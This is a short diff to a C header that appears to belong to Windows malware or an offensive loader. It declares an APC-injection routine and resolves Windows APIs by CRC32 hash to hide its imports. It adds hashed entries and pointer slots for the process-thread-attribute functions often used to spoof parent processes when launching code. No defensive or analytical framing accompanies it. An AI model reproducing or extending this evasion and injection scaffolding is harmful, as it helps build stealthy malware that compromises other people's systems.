@@ -15,6 +15,9 @@ BOOL QueueAPCInject_x64(HANDLE hProc, PVOID remoteAddr);
 #define CRC32_GLOBALMEMORYSTATUSEX 0x8b7c4b8e
 #define CRC32_CREATEFILEW 0x7c7ea48
 #define CRC32_DEVICEIOCONTROL 0x2f5a914c
+#define CRC32_UPDATEPROCTHREADATTRIBUTE 0x1d8a6317
+#define CRC32_INITIALIZEPROCTHREADATTRIBUTELIST 0x3c2b6b3
+#define CRC32_DELETEPROCTHREADATTRIBUTELIST 0x2a998b3c
 
 // Structure to hold the resolved function pointers
 typedef struct _API_FUNCTIONS {
@@ -27,4 +30,7 @@ typedef struct _API_FUNCTIONS {
     FARPROC pGlobalMemoryStatusEx;
     FARPROC pCreateFileW;
     FARPROC pDeviceIoControl;
+    FARPROC pUpdateProcThreadAttribute;
+    FARPROC pInitializeProcThreadAttributeList;
+    FARPROC pDeleteProcThreadAttributeList;
 } API_FUNCTIONS, *PAPI_FUNCTIONS;
